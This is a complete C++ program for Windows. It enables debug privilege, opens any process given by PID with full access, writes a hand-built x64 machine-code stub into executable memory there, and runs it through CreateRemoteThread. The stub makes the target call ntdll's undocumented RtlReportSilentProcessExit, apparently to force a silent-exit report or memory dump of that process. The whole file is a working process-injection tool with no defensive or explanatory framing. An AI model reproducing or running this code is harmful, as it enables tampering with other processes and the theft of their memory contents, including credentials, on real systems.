#include <Windows.h>
#include <iostream>

typedef NTSTATUS(NTAPI* RtlReportSilentProcessExitFunc)(HANDLE, NTSTATUS);

BOOL EnableDebugPrivilege() {
    HANDLE hToken = nullptr;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return FALSE;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) return FALSE;

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
}

int main(int argc, char* argv[]) {

    DWORD pid = atoi(argv[1]);
    if (!EnableDebugPrivilege()) 
    { 
        std::cout << "Failed SeDebugPrivilege\n"; 
        return -1; 
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) 
    { 
        std::cout << "OpenProcess failed: " << GetLastError() << "\n"; 
        return -1; 
    }

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    auto RtlReportSilentProcessExit = (RtlReportSilentProcessExitFunc)GetProcAddress(hNtdll, "RtlReportSilentProcessExit");
    if (!RtlReportSilentProcessExit) 
    { 
        std::cout << "Cannot find RtlReportSilentProcessExit\n"; 
        return -1; 
    }

    // Remote stub (x64)
    unsigned char stub[] = {
        0x48, 0xB9, 0,0,0,0,0,0,0,0,       // mov rcx, -1 (will patch)
        0x48, 0xBA, 0,0,0,0,0,0,0,0,       // mov rdx, 0 (will patch)
        0x48, 0xB8, 0,0,0,0,0,0,0,0,       // mov rax, <RtlReportSilentProcessExit>
        0xFF, 0xD0,                         // call rax
        0xC3                                // ret
    };

    // Patch values
    *(UINT64*)(stub + 2) = (UINT64)-1;                      // RCX = pseudo-handle
    *(UINT64*)(stub + 12) = 0;                              // RDX = exit status
    *(UINT64*)(stub + 22) = (UINT64)RtlReportSilentProcessExit; // RAX = function addr

    // Allocate memory in target process
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) 
    { 
        std::cout << "VirtualAllocEx failed\n"; 
        return -1; 
    }

    WriteProcessMemory(hProcess, remoteMem, stub, sizeof(stub), NULL);

    // Create remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) 
    { 
        std::cout << "CreateRemoteThread failed: " << GetLastError() << "\n"; 
        return -1; 
    }

    std::cout << "Remote thread created successfully!\n";
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}